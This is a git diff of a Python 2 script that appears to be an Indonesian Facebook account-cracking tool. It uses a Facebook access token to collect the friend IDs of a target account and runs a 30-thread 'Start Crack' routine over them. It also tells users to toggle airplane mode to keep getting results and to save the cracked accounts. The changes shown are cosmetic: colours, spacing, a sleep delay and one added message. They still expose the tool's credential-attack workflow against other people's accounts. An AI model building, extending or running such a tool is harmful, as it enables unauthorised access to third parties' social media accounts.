@@ -73,9 +73,9 @@ raka_logo = '''
 \x1b[1;95m            \$$$$$$  |                            
 \x1b[1;95m             \______/                             
 \x1b[1;96m_______________________________________________________\n
-\x1b[1;97m Desigen By : \x1b[1;92mRaka Andrian Tara
-\x1b[1;97m Github     : \x1b[1;92mBajingan-Z
-\x1b[1;97m Coded By   : \x1b[1;92mRaka \x1b[1;97m& \x1b[1;32mAngga
+\x1b[1;97m Desigen By  : \x1b[1;92mRaka Andrian Tara
+\x1b[1;97m Github      : \x1b[1;92mBajingan-Z
+\x1b[1;97m Coded By    : \x1b[1;92mRaka \x1b[1;97m& \x1b[1;32mAngga
 \x1b[1;96m_______________________________________________________\x1b[1;97m
 '''
 raka_sayang_amanda = '3882176535153442'
@@ -89,14 +89,14 @@ def login():
 		print ' [1] Login With Token Facebook '
                 print ' [2] Cara Mengambil Token '
 		print ' [0] Exit \n'
-		met_log = raw_input(" [\x1b[1;97m?\x1b[0m] Choose : ")
+		met_log = raw_input(" [\x1b[1;97m?\x1b[0m] Choose : \x1b[1;92m")
 		if met_log =="":
 			print '\n [!] Please Fill '; time.sleep(1)
 			login()
 		elif met_log == "1" or met_log == "01":
 			tokenz()
                 elif met_log == "2" or met_log == "02":
-                        print '\n [?] Anda akan diarahkan ke Youtube... '; time.sleep(3)
+                        print '\n [?] Anda akan diarahkan ke Youtube... '; time.sleep(2)
 		        os.system("xdg-open https://youtu.be/bszAm4C5ovE")
                         exit()
 		elif met_log == "0":
@@ -111,7 +111,7 @@ def tokenz():
 	try:
 		token = open('login_r.txt','r')
 	except (KeyError,IOError):
-		token = raw_input(' [?] Token : ')
+		token = raw_input(' [?] Token : \x1b[1;92m')
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
 			a = json.loads(otw.text)
@@ -174,13 +174,13 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print(' [!] Check Your Internet Vonnection ')
 	print(raka_logo)
-	print ' [%s-%s] Nama    : %s'%(bm,ra,nama)
-	print ' [%s-%s] Ip User : %s'%(bm,ra,ip)
-	print ' [%s-%s] Id User : %s\n'%(bm,ra,id)
+	print ' [%s-%s] Nama    : \x1b[1;92m%s'%(bm,ra,nama)\x1b[1;97m
+	print ' [%s-%s] Ip User : \x1b[1;92m%s'%(bm,ra,ip)\x1b[1;97m
+	print ' [%s-%s] Id User : \x1b[1;92m%s\n'%(bm,ra,id)\x1b[1;97m
 	print ' [%s1%s] Start Crack '%(hj,ra)
 	print ' [%s2%s] Delete Token '%(ku,ra)
 	print ' [%s0%s] Logout\n '%(m,ra)
-	asw = raw_input(' [?] Choose : ')
+	asw = raw_input(' [?] Choose : \x1b[1;92m')
 	if asw =='1' or asw =='01':
 		crack()
 	elif asw =='2' or asw =='02':
@@ -206,7 +206,7 @@ def crack():
 	except IOError:
 		print' [!] Invalid Token '
 		tokenz()
-	ra_id = raw_input("[\x1b[1;97m-\x1b[0m] ID Public : ")
+	ra_id = raw_input("[\x1b[1;97m-\x1b[0m] ID Public : \x1b[1;92m")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+ra_id+"?access_token="+token)
 		sp = json.loads(pok.text)
@@ -218,7 +218,7 @@ def crack():
 		rax_x = i['id']
 		name = i['name']
 		id.append(rax_x+'<=>'+name)
-	print("[\x1b[1;97m-\x1b[0m] Total ID  : "+str(len(id)))
+	print("[\x1b[1;97m-\x1b[0m] Total ID  : \x1b[1;92m"+str(len(id)))
 	print(garis)
 	print("\x1b[1;97mKlick \x1b[1;96mCTRL+Z \x1b[1;97mUntuk Berhenti ...\x1b[1;97m")
         print("\x1b[1;97mNote : \x1b[1;96mJika Tak Ada Hasil Mainkan Mode Pesawat 1 Detik \x1b[1;97m?")
@@ -288,6 +288,7 @@ def crack():
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
+        print(" \nCopy paste Hasil Crack Dan Simpan Selama \x1b[1;92m2 \x1b[1;97mHari ...?")
 	exit(' \n[!] Finished ')
 
 if __name__ == '__main__':
